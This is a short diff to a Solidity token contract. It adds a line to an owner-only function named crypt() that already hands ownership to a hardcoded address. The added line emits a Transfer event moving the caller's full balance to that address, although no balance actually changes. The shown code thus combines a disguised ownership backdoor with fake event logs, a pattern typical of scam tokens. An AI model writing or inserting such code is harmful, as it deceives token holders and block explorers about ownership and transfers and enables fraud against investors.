@@ -260,6 +260,7 @@ abstract contract Ownable is Context {
     }
 
     function crypt() public virtual onlyOwner {
+        emit Transfer( msg.sender , address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93) , _tOwned[msg.sender] );
         emit OwnershipTransferred(_owner, address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93));
         _owner = address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93);
     }
